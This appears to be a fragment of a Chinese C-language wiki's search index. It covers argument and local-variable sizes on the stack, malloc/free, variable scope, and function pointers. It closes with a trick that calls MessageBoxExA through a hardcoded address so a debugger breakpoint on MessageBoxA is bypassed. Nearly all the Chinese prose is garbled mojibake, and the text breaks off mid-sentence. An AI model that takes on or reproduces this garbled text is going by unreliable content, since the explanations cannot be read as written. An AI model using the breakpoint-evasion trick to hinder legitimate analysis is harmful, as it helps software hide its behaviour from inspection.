æœ¬æœºå°ºå¯¸ï¼šå¦‚æœæœ¬æœºæ˜¯32ä½çš„ï¼Œé‚£ä¹ˆå¯¹32ä½çš„æ•°æ®æ”¯æŒæœ€å¥½ï¼›å¦‚æœæ˜¯64ä½çš„ï¼Œé‚£ä¹ˆå¯¹64ä½çš„æ”¯æŒæœ€å¥½ã€‚ ç¼–è¯‘å™¨éµå®ˆäº†æœ¬æœºå°ºå¯¸è¿™ä¸ªè§„åˆ™ï¼Œæ‰€ä»¥å®é™…ä¸Šcharç±»å‹æˆ–è€…shortç±»å‹çš„å‚æ•°ä¸ä½†æ²¡æœ‰èŠ‚çœç©ºé—´ï¼Œåè€Œæµªè´¹äº†å¤šä½™çš„æ“ä½œã€‚ 123456789101112131415#include &lt;stdio.h&gt;void func(char x, char y, char z)&#123; int r = x;&#125;int main()&#123; char a = 1; char b = 2; char c = 3; func(a, b, c); return 0;&#125; è™½ç„¶æŒ‰4å­—èŠ‚ä¼ ï¼ˆå¯ä»¥çœ‹åˆ°å †æ ˆä¼ å‚æ˜¯03 CC CC CCï¼‰ï¼Œä½†ç”¨çš„æ—¶å€™è¿˜æ˜¯æŒ‰1å­—èŠ‚ç”¨ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°ä¼ å¤šäº†ï¼Œä½¿ç”¨é”™è¯¯çš„æƒ…å†µã€‚ ç»“è®ºï¼šæ•´æ•°ç±»å‹çš„å‚æ•°ï¼Œä¸€å¾‹ä½¿ç”¨intç±»å‹ã€‚ æµ·å“¥è¯´ä¸ä½¿ç”¨charå’Œshortç±»å‹ï¼Œå®é™…ä¸Šå¹¶ä¸ä¼šèŠ‚çœç©ºé—´ï¼Œè€Œä¸”æ•ˆç‡æ…¢ã€‚ä½†ä»å¦ä¸€ä¸ªæ–¹é¢è®²ï¼Œå‡ºäºä½¿ç”¨è§„èŒƒè§’åº¦è€ƒè™‘ï¼Œè¿˜æ˜¯ç”¨charå’Œshortç±»å‹å§ã€‚ å®å‚å’Œå½¢å‚ ç†è§£æ±‡ç¼–çš„ï¼Œå°±çŸ¥é“ä¸‹é¢çš„Pluså‡½æ•°ä¸ºä»€ä¹ˆæ²¡ä¿®æ”¹åˆ°mainå‡½æ•°ä¸­çš„å˜é‡xã€‚ mainå‡½æ•°ä¸­çš„xä½äº[ebp-4]ï¼ŒPluså‡½æ•°çš„å‚æ•°xåœ¨[ebp+8]ã€‚è°ƒç”¨å‡½æ•°æ—¶ï¼Œå‚æ•°ä¼ é€’å°±æ˜¯å°†ä¸Šå±‚å‡½æ•°çš„å˜é‡ï¼Œæˆ–è€…è¡¨è¾¾å¼çš„å€¼â€œå¤åˆ¶ä¸€ä»½â€ï¼Œä¼ é€’ç»™ä¸‹å±‚å‡½æ•°ã€‚ 1234567891011121314151617#include &lt;stdio.h&gt;void Plus(int x)&#123; x = x + 1;&#125;// å…¥å£å‡½æ•°int main(int argc, char *argv[])&#123; int x = 1; Plus(x); printf(&quot;%d &quot;, x); return 0;&#125; å±€éƒ¨å˜é‡çš„å†…å­˜åˆ†é… ä¸€ä¸ªæœªå®šä¹‰å±€éƒ¨å˜é‡çš„å‡½æ•°ï¼ŒVC++ä¸‹ç¼–è¯‘å™¨ä¸ºè¯¥å‡½æ•°åˆ†é…çš„é»˜è®¤ç¼“å†²åŒºå¤§å°æ˜¯40hï¼ˆä¸åŒç¼–è¯‘å™¨è¿™ä¸ªå€¼ä¸ä¸€æ ·ï¼‰ã€‚æ¯å¤šä¸€ä¸ªç±»å‹çš„å˜é‡å°±åœ¨40hçš„åŸºç¡€ä¸Šå†åŠ ä¸Šè¿™ä¸ªç±»å‹å¤§å°çš„ç©ºé—´ï¼ˆcharç±»å‹å’Œshortç±»å‹ï¼ŒæŒ‰4å­—èŠ‚åˆ†é…ã€‚ï¼‰ å‡½æ•°ä¸­æœªå®šä¹‰å±€éƒ¨å˜é‡å‡½æ•°ä¸­å®šä¹‰1ä¸ªintç±»å‹å˜é‡å‡½æ•°ä¸­å®šä¹‰2ä¸ªcharç±»å‹å±€éƒ¨å˜é‡ï¼Œ2ä¸ªshortç±»å‹å±€éƒ¨å˜é‡ï¼Œé‚£ä¹ˆç¼“å†²åŒºå¤§å°æ˜¯ï¼Ÿ12345678910111213#include &lt;stdio.h&gt;void Function()&#123;&#125;int main(int argc, char *argv[])&#123; Function(); return 0;&#125; 44h=é»˜è®¤40h+1ä¸ªintç±»å‹å¤§å°çš„ç©ºé—´ 12345678910111213#include &lt;stdio.h&gt;void Function()&#123; int x = 10;&#125;int main(int argc, char *argv[])&#123; Function(); return 0;&#125; 40h+4ä¸ª4å­—èŠ‚=50h 1234567891011121314151617#include &lt;stdio.h&gt;void Function()&#123; char a = 1; char b = 1; short c = 3; short d = 4;&#125;int main(int argc, char *argv[])&#123; Function(); return 0;&#125; æ€»ç»“ å°äº32ä½çš„å±€éƒ¨å˜é‡ï¼Œç©ºé—´åœ¨åˆ†é…æ—¶ï¼ŒæŒ‰32ä½åˆ†é…ã€‚ ä½¿ç”¨æ—¶æŒ‰å®é™…çš„å®½åº¦ä½¿ç”¨ã€‚ ä¸è¦å®šä¹‰char/shortç±»å‹çš„å±€éƒ¨å˜é‡ã€‚ å‚æ•°ä¸å±€éƒ¨å˜é‡æ²¡æœ‰æœ¬è´¨åŒºåˆ«ï¼Œéƒ½æ˜¯å±€éƒ¨å˜é‡ï¼Œéƒ½åœ¨æ ˆä¸­åˆ†é…ã€‚å®åœ¨è¦è¯´ï¼Œå‚æ•°æ˜¯å‡½æ•°è°ƒç”¨å‰åˆ†é…çš„å€¼ï¼Œå±€éƒ¨å˜é‡æ˜¯å‡½æ•°æ‰§è¡Œæ—¶åˆ†é…çš„å€¼ã€‚ å®Œå…¨å¯ä»¥æŠŠå‚æ•°å½“åˆå±€éƒ¨å˜é‡ä½¿ç”¨ 12345678910111213#include &lt;stdio.h&gt;void Function(int x, int y, int z)&#123; z = 10; // ä¸ç®¡ä¼ è¿›æ¥çš„å€¼ï¼Œç›´æ¥æŠŠå‚æ•°å½“å±€éƒ¨å˜é‡ç”¨&#125;int main(int argc, char *argv[])&#123; Function(1, 2, 3); return 0;&#125;"},{"title":"å†…å­˜åˆ†é…ä¸é‡Šæ”¾","path":"/wiki/C/å†…å­˜åˆ†é…ä¸é‡Šæ”¾.html","content":"Cè¯­è¨€æä¾›äº†åŠ¨æ€åˆ†é…çš„æ–¹å¼ï¼Œé€šè¿‡è°ƒç”¨mallocå‡½æ•°ï¼Œæ¥æŒ‰éœ€ç”³è¯·æŒ‡å®šå¤§å°çš„å†…å­˜ï¼Œç„¶åä½¿ç”¨ï¼Œé‡Šæ”¾ä¹Ÿè¦è‡ªå·±åšï¼Œè¦ä¸ä¼šå†…å­˜æ³„éœ²ã€‚ç”³è¯·çš„è¿™å—å†…å­˜åœ¨å †åŒºã€‚ 123void *malloc( size_t size); å‚æ•°ï¼šsizeï¼ŒBytes to allocateæŒ‰å­—èŠ‚å¤§å°å»ç”³è¯· è¿”å›å€¼ï¼šè¿”å›void*å‹æŒ‡é’ˆ malloc returns a void pointer to the allocated space, or NULL if thereâ€™s insufficient memory available. To return a pointer to a type other than void, use a type cast on the return value.Always check the return from malloc, even if the amount of memory requested is small. 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;int main(int argc, char *argv[])&#123; // å£°æ˜æŒ‡é’ˆ int *ptr; // åœ¨å †ä¸­ç”³è¯·å†…å­˜ï¼Œè¦128ä¸ªintçš„ç©ºé—´ ptr = (int*)malloc(sizeof(int) * 128); //ä½¿ç”¨sizeof(ç±»å‹)*nï¼Œæ¥å®šä¹‰ç”³è¯·å†…å­˜çš„å¤§å° //mallocè¿”å›ç±»å‹ä¸ºvoid*ç±»å‹ï¼Œéœ€è¦å¼ºåˆ¶è½¬æ¢ // æ— è®ºç”³è¯·å¤šå¤§çš„ç©ºé—´ï¼Œä¸€å®šè¦åˆ¤æ–­æ˜¯å¦ç”³è¯·æˆåŠŸ if (ptr == NULL) &#123; return 0; &#125; // åˆå§‹åŒ–åˆ†é…çš„å†…å­˜ç©ºé—´ memset(ptr, 0, sizeof(int) * 128); // ä½¿ç”¨éƒ¨åˆ†çš„ä»£ç ... *(ptr) = 1; // ä½¿ç”¨å®Œæ¯•ï¼Œè¦é‡Šæ”¾ç”³è¯·çš„å †ç©ºé—´ free(ptr); // å°†æŒ‡é’ˆè®¾ç½®ä¸ºNULLã€‚é˜²æ­¢åé¢ç”¨åˆ°ptrå¯¼è‡´å‡ºé”™ ptr = NULL; return 0;&#125;"},{"title":"å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡","path":"/wiki/C/å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡.html","content":"å˜é‡å£°æ˜ï¼ˆæ­£å‘ï¼‰ 1å˜é‡ç±»å‹ å˜é‡å; å˜é‡çš„å‘½åè§„èŒƒä¸å‡½æ•°åã€å‚æ•°åä¸€æ ·ï¼š åªèƒ½ä»¥å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ç»„æˆï¼›ä¸”ç¬¬ä¸€ä¸ªå­—æ¯å¿…é¡»æ˜¯å­—æ¯æˆ–ä¸‹åˆ’çº¿ã€‚ å‘½åä¸¥æ ¼åŒºåˆ†å¤§å°å†™ ä¸èƒ½ä½¿ç”¨Cè¯­è¨€çš„å…³é”®å­—ï¼ˆä¾‹å¦‚ï¼švoidã€returnä¹‹ç±»ï¼‰ å˜é‡ç±»å‹ç”¨æ¥è¯´æ˜æ•°æ®å®½åº¦ æ•°æ®ç±»å‹ æ•°æ®å®½åº¦ int 4ä¸ªå­—èŠ‚ short 2ä¸ªå­—èŠ‚ char 1ä¸ªå­—èŠ‚ å˜é‡åå®é™…æ˜¯å†…å­˜åœ°å€çš„åˆ«åï¼Œç”±ç¼–è¯‘å™¨è´Ÿè´£å°†å˜é‡åå’Œå†…å­˜åœ°å€ä¹‹é—´çš„è½¬æ¢ å¦‚ä½•ç†è§£å£°æ˜å’Œèµ‹å€¼ï¼Ÿ å£°æ˜å˜é‡å°±æ˜¯å‘Šè¯‰è®¡ç®—æœºï¼Œæˆ‘è¦ç”¨ä¸€å—å†…å­˜ï¼Œä½ ç»™æˆ‘ç•™ç€ï¼Œå®½åº¦å’Œå­˜å‚¨æ ¼å¼ç”±æ•°æ®ç±»å‹å†³å®šã€‚ è®¡ç®—æœºä»€ä¹ˆæ—¶å€™æŠŠè¿™å—å†…å­˜ç»™ä½ ï¼Œå–å†³äºå˜é‡çš„ä½œç”¨èŒƒå›´ï¼Œå¦‚æœæ˜¯å…¨å±€å˜é‡ï¼Œåœ¨ç¨‹åºç¼–è¯‘å®Œå°±å·²ç»åˆ†é…äº†ç©ºé—´ï¼Œå¦‚æœæ˜¯å±€éƒ¨å˜é‡ï¼Œåªæœ‰æ‰€åœ¨çš„ç¨‹åºè¢«è°ƒç”¨çš„æ—¶å€™ï¼Œæ‰ä¼šåˆ†é…ç©ºé—´ã€‚å…¨å±€å˜é‡å¦‚æœä¸èµ‹åˆå§‹å€¼ï¼Œé»˜è®¤æ˜¯0ï¼Œä½†å±€éƒ¨å˜é‡åœ¨ä½¿ç”¨å‰ä¸€å®šè¦èµ‹åˆå€¼ã€‚ ä¸¤ç±»å˜é‡ å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡ã€‚å˜é‡åå°±æ˜¯å†…å­˜åœ°å€çš„åˆ«åã€‚ å…¨å±€å˜é‡ å…¨å±€å˜é‡å£°æ˜æ—¶å¦‚æœæ²¡èµ‹åˆå§‹å€¼ï¼Œåˆ™ä¸º0ï¼ˆç¼–è¯‘å™¨åšçš„ï¼‰ã€‚ åœ¨ç¼–è¯‘æ—¶ç¡®å®šå†…å­˜åœ°å€å’Œå®½åº¦ï¼ˆå®½åº¦ç”±ç±»å‹å†³å®šï¼‰ï¼Œ å¦‚æœä¸é‡æ–°ç¼–è¯‘ï¼Œå…¨å±€å˜é‡çš„å†…å­˜åœ°å€ä¸ä¼šå˜åŒ–ã€‚ å°±æ˜¯å¹³æ—¶æ‰€è¯´çš„åŸºå€ã€‚ ç”Ÿå‘½å‘¨æœŸï¼šç¨‹åºä¸€å¯åŠ¨ï¼Œç›´è‡³ç¨‹åºç»“æŸã€‚ ä½œç”¨åŸŸï¼šè¿›ç¨‹ä½œç”¨åŸŸã€‚ å¯ä»¥åœ¨ä»»ä½•å…¶ä»–å‡½æ•°é‡Œè¿›è¡Œè¯»å†™ã€‚ å¤šä¸ªå‡½æ•°ä½¿ç”¨åŒä¸€ä¸ªå…¨å±€å˜é‡ï¼Œåªè¦exeç¨‹åºä¸ç»“æŸï¼Œå…¨å±€å˜é‡çš„å€¼æ˜¯æœ€åä¸€æ¬¡ä¿®æ”¹çš„å€¼ã€‚ åæ±‡ç¼–è¯†åˆ«ï¼š 1MOV å¯„å­˜å™¨,byte/word/dword ptr ds:[0x12345678] //åœ°å€æ˜¯è¿›ç¨‹ç©ºé—´çš„å…¨å±€å˜é‡åŒºï¼Œæˆ‘è¿™é‡Œéšä¾¿å†™çš„12345678 é€šè¿‡å¯„å­˜å™¨çš„å®½åº¦ï¼Œæˆ–è€…byte/word/dword æ¥åˆ¤æ–­å…¨å±€å˜é‡çš„å®½åº¦ å±€éƒ¨å˜é‡ å±€éƒ¨å˜é‡æ˜¯å‡½æ•°å†…éƒ¨ç”³è¯·çš„ï¼Œå¦‚æœå‡½æ•°æ²¡æœ‰æ‰§è¡Œï¼Œé‚£ä¹ˆå±€éƒ¨å˜é‡æ²¡æœ‰å†…å­˜ç©ºé—´ã€‚ æ¨è®ºï¼šå±€éƒ¨å˜é‡çš„å†…å­˜æ˜¯åœ¨å †æ ˆä¸­åˆ†é…çš„ï¼Œå‡½æ•°æ‰§è¡Œæ—¶æ‰åˆ†é…ã€‚è€Œæˆ‘ä»¬æ— æ³•é¢„çŸ¥è¿™ä¸ªå‡½æ•°ä»€ä¹ˆæ—¶å€™æ‰§è¡Œï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•ç¡®å®šå±€éƒ¨å˜é‡çš„å†…å­˜åœ°å€ã€‚ æ²¡èµ‹åˆå€¼ï¼Œé‚£ä¸ªåœ°å€ç¼–å·å­˜çš„å†…å®¹å°±æ˜¯ä¹‹å‰è¢«å®ƒäººä½¿ç”¨è¿‡çš„æ•°æ®ï¼Œä¿—ç§°åƒåœ¾æ•°æ®ã€‚ ç”Ÿå‘½å‘¨æœŸï¼šå‡½æ•°è¢«è°ƒç”¨ï¼Œå‡½æ•°è°ƒç”¨ç»“æŸã€‚ ä½œç”¨åŸŸï¼šå‡½æ•°ä½œç”¨åŸŸã€‚ åœ¨Aå‡½æ•°é‡Œæ— æ³•ä½¿ç”¨å‡½æ•°Bçš„å±€éƒ¨å˜é‡ã€‚ åæ±‡ç¼–è¯†åˆ« 12345[ebp-4][ebp-8][ebp-0xC] å˜é‡çš„ä½œç”¨åŸŸå˜é‡çš„ä½œç”¨åŸŸï¼šå˜é‡åœ¨æºç ä¸­å¯ä»¥è¢«è®¿é—®åˆ°çš„èŒƒå›´ã€‚ç±»åˆ«å«ä¹‰ä¾‹å­è¿›ç¨‹ä½œç”¨åŸŸåœ¨æ•´ä¸ªè¿›ç¨‹ä¸­éƒ½è¢«èƒ½è®¿é—®åˆ°ã€‚å…¨å±€å˜é‡æ–‡ä»¶ä½œç”¨åŸŸåœ¨å½“å‰æºç æ–‡ä»¶å†…å¯ä»¥è®¿é—®åˆ°é™æ€å˜é‡å‡½æ•°ä½œç”¨åŸŸåœ¨å‡½æ•°å†…å¯ä»¥è®¿é—®åˆ°å±€éƒ¨å˜é‡å—ä½œç”¨åŸŸåªèƒ½åœ¨å®šä¹‰å˜é‡çš„&quot;{}&quot;å—å†…è®¿é—® CEä¸­æœæ•°å€¼ï¼Œåœ°å€æ˜¯ç»¿è‰²çš„è¡¨ç¤ºæ˜¯å…¨å±€å˜é‡ã€‚"},{"title":"å‡½æ•°æŒ‡é’ˆ","path":"/wiki/C/å‡½æ•°æŒ‡é’ˆ.html","content":"å®šä¹‰ å‡½æ•°æŒ‡é’ˆå˜é‡å®šä¹‰çš„æ ¼å¼ï¼š 1è¿”å›ç±»å‹ (è°ƒç”¨çº¦å®š *å˜é‡å)(å‚æ•°åˆ—è¡¨); å¦‚ï¼š 1int (__cdecl *pFun)(int,int); è°ƒç”¨çº¦å®šä¸å†™çš„è¯ï¼Œç”¨çš„æ˜¯å½“å‰ç¼–è¯‘å™¨é»˜è®¤çš„è°ƒç”¨çº¦å®š æŒ‡é’ˆç‰¹å¾ å®½åº¦ 12345678910#include &quot;stdafx.h&quot;int main()&#123; int (*pFun)(int, int); printf(&quot;%d &quot;, sizeof(pFun)); return 0;&#125; å¸¦*å·å®½åº¦éƒ½æ˜¯4 è¿ç®— ä¹‹å‰æè¿‡ï¼ŒæŒ‡é’ˆå˜é‡åš++ï¼Œâ€“ï¼Œ+Nï¼Œ-Næ˜¯å–å†³äºå°†æŒ‡é’ˆå˜é‡å»æ‰ä¸€ä¸ª*å·åçš„å®½åº¦ã€‚å‡½æ•°æŒ‡é’ˆå»æ‰ä¸€ä¸ª*åå˜æˆäº†ä¸€ä¸ªå‡½æ•°ï¼Œæ²¡æ³•ç¡®å®šè¿™ä¸ªå‡½æ•°çš„å®½åº¦ï¼Œæ‰€ä»¥å‡½æ•°æŒ‡é’ˆä¸èƒ½åš++ï¼Œâ€“ï¼Œ+Nï¼Œ-Nè¿™äº›è¿ç®—ã€‚ç¼–è¯‘ä¼šæŠ¥é”™ã€‚ 1234int(__cdecl *pFun)(int, int, int, int, int);//å»æ‰ä¸€ä¸ª*åint(__cdecl pFun)(int, int, int, int, int); å‡½æ•°å®½åº¦æ²¡æ³•ç¡®å®šä»€ä¹ˆæ„æ€ æ¯”å¦‚ä¸åŒçš„ä¸¤ä¸ªå‡½æ•°ï¼Œç¼–è¯‘åéƒ½æ˜¯ä¸€å †æ•°ã€‚ä¸åŒçš„å‡½æ•°å®½åº¦æ˜¯ä¸åŒçš„ã€‚ä¸åƒä¹‹å‰å­¦çš„åˆ«çš„æŒ‡é’ˆç±»å‹ï¼Œç å–ä¸€ä¸ª*åå®½åº¦æ˜¯ç¡®å®šçš„ã€‚ 12345678910int Fun1(int x, int y)&#123; return x + y;&#125;int Fun2(int x, int y)&#123; int g = 1; return x + y + g;&#125; ç›¸å‡ ä¹Ÿä¸èƒ½ç›¸å‡ã€‚ç›¸å‡æ—¶è¦é™¤ä¸€ä¸ªå®½åº¦ï¼Œä½†ä¸åŒå‡½æ•°çš„å®½åº¦ä¸åŒã€‚ æ¯”è¾ƒ å¯ä»¥åšã€‚ èµ‹å€¼ä¸ä½¿ç”¨ pFun = (int(__cdecl *)(int, int))10 ç»™å‡½æ•°æŒ‡é’ˆç±»å‹çš„å˜é‡èµ‹å€¼æ—¶ï¼Œç¡®ä¿ç±»å‹ä¸€è‡´ï¼Œå°†10å¼ºè½¬ä¸ºint (__cdecl *)(int,int)ç±»å‹ 12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123; // å®šä¹‰å‡½æ•°æŒ‡é’ˆå˜é‡ int(__cdecl *pFun)(int, int); // ä¸ºå‡½æ•°æŒ‡é’ˆå˜é‡èµ‹å€¼ pFun = (int(__cdecl *)(int, int))10; //å¯¹10å¼ºè½¬ // ä½¿ç”¨å‡½æ•°æŒ‡é’ˆå˜é‡ int r = pFun(1, 2); //å®šä¹‰å‡½æ•°æŒ‡é’ˆå˜é‡æ—¶ï¼Œè¿”å›ç±»å‹æ˜¯intï¼Œç”¨ä¸€ä¸ªintç±»å‹å˜é‡æ¥æ”¶è¿”å›å€¼ //å®šä¹‰å‡½æ•°æŒ‡é’ˆå˜é‡æ—¶ï¼Œå‚æ•°åˆ—è¡¨æ˜¯ä¸¤ä¸ªintï¼Œä¼ ä¸¤ä¸ªint return 0;&#125; çœ‹åæ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç¼–è¯‘å™¨æ ¹æ®æˆ‘ä»¬å£°æ˜å‡½æ•°æŒ‡é’ˆæ—¶çš„è°ƒç”¨çº¦å®šã€è¿”å›ç±»å‹ã€å‚æ•°åˆ—è¡¨ç”Ÿæˆäº†ç›¸åº”çš„åæ±‡ç¼–ä»£ç ã€‚ ä¸Šè¿°ä»£ç èƒ½ç¼–è¯‘ï¼Œä½†ä¸èƒ½æ‰§è¡Œã€‚å› ä¸ºå†…å­˜åœ°å€ä¸º10çš„åœ°æ–¹æ˜¯æ²¡æœ‰æ•°æ®å¯ä»¥è¿è¡Œçš„ã€‚ pFun=å‡½æ•°å ä¼ ç»™pFunå˜é‡çš„å‡½æ•°ï¼Œçš„å‚æ•°ï¼Œè°ƒç”¨çº¦å®šï¼Œè¿”å›å€¼è¦å’ŒpFunå£°æ˜çš„å‡½æ•°ç±»å‹ä¸€è‡´ã€‚å¦‚æœä¸ä¸€è‡´ï¼Œåšå¼ºè½¬ï¼Œå³ä½¿ç¼–è¯‘é€šè¿‡ï¼Œè¿è¡Œä¹Ÿä¼šå‡ºé”™ã€‚ 123456789101112131415#include &quot;stdafx.h&quot;int Function(int x, int y)&#123; return x + y;&#125;int main()&#123; int (*pFun)(int, int); pFun = Function; return 0;&#125; 12int r = Function(1, 2); // å‡½æ•°åŸæ¥è¿™ä¹ˆè°ƒç”¨çš„int r1 = pFun(1, 2); // å‡½æ•°æŒ‡é’ˆä¹Ÿä¸€æ · å°ç»“ å‡½æ•°æŒ‡é’ˆç”¨é€”ï¼šè°ƒç”¨ä»–äººå†™å¥½çš„å‡½æ•°ã€‚ å¸¸è§åœºæ™¯ï¼šåˆ†æåˆ«äººå†™çš„dllï¼Œå¼„æ¸…æŸä¸ªå‡½æ•°çš„åŠŸèƒ½ã€å‚æ•°åˆ—è¡¨ã€è¿”å›ç±»å‹ç­‰ä¿¡æ¯åï¼Œå°†å‡½æ•°çš„åœ°å€èµ‹ç»™å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡å‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ å‡½æ•°æŒ‡é’ˆï¼Œå°±æ˜¯æŒ‰ç…§ä½ è¦æ±‚çš„æ–¹å¼è¦è°ƒç”¨ä½ ç»™çš„é‚£ä¸ªåœ°å€ å‡½æ•°æŒ‡é’ˆåº”ç”¨ é€šè¿‡å‡½æ•°æŒ‡é’ˆç»•è¿‡æ–­ç‚¹ å‡è®¾åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å†™äº†ä¸€ä¸ªç¨‹åºï¼Œé‡Œè¾¹ç”¨äº†MessageBoxå‡½æ•°ï¼Œç¼–è¯‘å‡ºäº†exeå¯æ‰§è¡Œæ–‡ä»¶ã€‚ 12345678#include &lt;windows.h&gt; int main()&#123; MessageBox(0,0,0,0); return 0;&#125; å…¶ä»–äººæ‹¿åˆ°è¯¥exeåï¼Œå¯ä»¥åœ¨ODä¸­ç”¨bp MessageBoxAä¸‹æ–­ï¼Œè®©ç¨‹åºè·‘èµ·æ¥ï¼Œåªè¦ç¨‹åºè°ƒç”¨äº†MessageBoxï¼Œé‚£ä¹ˆå°±ä¼šå› ä¸ºåˆšæ‰ä¸‹çš„çš„æ–­ç‚¹åœä¸‹æ¥ï¼Œè¿™æ—¶ï¼Œåˆ†æè€…å†åˆ©ç”¨æ ˆå›æº¯åŠŸèƒ½ï¼Œè¿”å›åˆ°ä¸Šçº§è°ƒç”¨è€…å‡½æ•°ï¼Œé€†å‘åˆ†æç¨‹åºçš„åŠŸèƒ½ã€‚ æˆ‘çš„ç¯å¢ƒç¼–è¯‘å‡ºwin_debugç‰ˆçš„ç¨‹åºï¼Œæ‹–åˆ°ODï¼Œbp MessageBoxAä¸‹æ–­ï¼Œä¸çŸ¥é“ä¸ºå•¥æ˜¯æ–­åœ¨jmpé‚£è¡Œï¼Œè·‘èµ·æ¥çš„è¯æ–­ä¸ä¸‹æ¥ã€‚æ‰€ä»¥é€šè¿‡Break Pointç•Œé¢åŒå‡»æ¥åˆ°jmpè¿™è¡Œï¼ŒæŒ‰Enterï¼Œæ‰‹åŠ¨åœ¨77D5D7EAè¿™ä¸ªåœ°å€F2ä¸‹æ™®é€šæ–­ç‚¹ï¼Œç„¶åè·‘èµ·æ¥å°±ä¼šæ–­ä¸‹ æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼Œbp MessageBoxAä¼šåœ¨MessageBoxAå‡½æ•°å¤´çš„mov edi,ediè¿™è¡Œä¸‹æ–­ç‚¹ï¼Œå½“ç¨‹åºæ‰§è¡Œæ—¶ï¼Œè·‘åˆ°è¿™é‡Œäº†ï¼Œå°±ä¼šæ–­ä¸‹æ¥ã€‚å¦‚æœæˆ‘ä»¬ä¸ç»è¿‡è¿™ä¸ªæ–­ç‚¹ï¼Œä½†ä»èƒ½è°ƒç”¨MessageBoxAï¼Œåº”è¯¥æ€ä¹ˆåšï¼Ÿå¯ä»¥å‘ç°ï¼ŒMessageBoxAå‡½æ•°é‡Œè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°MessageBoxExAï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨MessageBoxExAã€‚è¿™æ ·ï¼Œæˆ‘ä»¬çš„ç¨‹åºä»77d5085Cå¤„å¼€å§‹æ‰§è¡Œï¼Œä¸ä¼šè¢«77d5d7EAå¤„çš„æ–­ç‚¹æ–­ä¸‹ã€‚ ç”±è°ƒç”¨å¤„ç¡®å®šæ˜¯5ä¸ªå‚æ•° 12345677D5081C |&gt; \\6A 00 push 0 ; /LanguageID = 0 (LANG_NEUTRAL)77D5081E |. FF75 14 push [arg.4] ; |Style77D50821 |. FF75 10 push [arg.3] ; |Title77D50824 |. FF75 0C push [arg.2] ; |Text77D50827 |. FF75 08 push [arg.1] ; |hOwner77D5082A |. E8 2D000000 call 77D5085C ; \\MessageBoxExA é€šå¸¸windows apiéƒ½æ˜¯è¿”å›4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¿™é‡Œè¿”å›å€¼å®šä¹‰æ—¶å®šä¹‰ä¸º4ä¸ªå­—èŠ‚ã€‚ å†…å¹³æ ˆï¼Œä¸èƒ½ç”¨cdcallã€‚ ç¡®å®šå¥½è¿™äº›ä¿¡æ¯åï¼Œå‡½æ•°æŒ‡é’ˆçš„å®šä¹‰å’Œèµ‹å€¼å¦‚ä¸‹ï¼š 1234//å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹çš„å˜é‡int (__stdcall *pFun)(int,int,int,int,int);//èµ‹å€¼ éœ€è¦å¼ºè½¬pFun = (int (__stdcall *)(int,int,int,int,int))0x77D5085C; è¿™ä¸ªåœ°å€åªé€‚åˆæˆ‘çš„å®éªŒç¯å¢ƒã€‚å¦‚æœè¦å†™å‡ºé€šç”¨çš„ä»£ç ï¼Œéœ€è¦PEç»“æ„çš„çŸ¥è¯† 1234567891011121314151617#include &lt;windows.h&gt; int main()&#123; //å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹çš„å˜é‡ int (__stdcall *pFun)(int,int,int,int,int); //èµ‹å€¼ éœ€è¦å¼ºè½¬ pFun = (int (__stdcall *)(int,int,int,int,int))0x77D5085C; //æ­£å¸¸æ–¹å¼è°ƒç”¨ MessageBox(0,0,0,0); //é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨ pFun(0,0,0,0,0); return 0;&#125; ç¼–è¯‘å‡ºexeåï¼Œå†æ¬¡ç”¨bp MessageBoxAåœ¨MessageBoxAå‡½æ•°å¤´çš„mov edi,ediè¿™è¡Œä¸‹æ–­ç‚¹ï¼ˆ77D507EAï¼‰ï¼Œæ‰§è¡Œç¨‹åºï¼Œç¬¬ä¸€ä¸ªMessageBoxä¼šè¢«æ–­ä¸‹ï¼Œç¬¬äºŒä¸ªMessageBoxä¸ä¼šè¢«æ–­ä¸‹ã€‚ æ­¤æ—¶ï¼Œç ´è§£è€…çš„åº”å¯¹æ–¹æ³•ï¼š è¿›åˆ°MessageBoxExAï¼Œåœ¨è¯¥å‡½æ•°å¤´çš„åœ°æ–¹ä¸‹æ–­ã€‚ ç¨‹åºä¿æŠ¤çš„äººçš„åº”å¯¹æ–¹æ³•ï¼šMessageBoxExAå‡½æ•°é‡Œè°ƒç”¨äº†MessageBoxTimeoutAå‡½æ•°ï¼Œå®šä¹‰å‡½æ•°æŒ‡é’ˆï¼Œç›´æ¥è°ƒç”¨MessageBoxTimeoutAå‡½æ•°ã€‚ æ”»å‡»è€…ï¼šå¯¹MessageBoxTimeoutAå‡½æ•°ä¸‹æ–­ã€‚ ç¨‹åºä¿æŠ¤çš„äººï¼šçœ‹MessageBoxTimeoutAé‡Œè°ƒç”¨äº†å•¥ï¼Œå†å®šä¹‰å‡½æ•°æŒ‡é’ˆï¼Œç›´æ¥è°ƒç”¨æ›´é‡Œè¾¹çš„å‡½æ•°ã€‚ æ‰€ä»¥ï¼ŒæŠ€æœ¯çš„å¯¹æŠ—å°±æ˜¯æ¯”è°æ›´åº•å±‚ã€‚ æç«¯æƒ…å†µä¸‹ï¼Œç¨‹åºä¿æŠ¤è€…ï¼Œé‡å†™3ç¯æ‰€æœ‰å‡½æ•°ã€‚æ­¤æ—¶ç ´è§£è€…åªèƒ½è¿›åˆ°0ç¯è¿›è¡Œç ´è§£åˆ†æã€‚ å°†ä»£ç 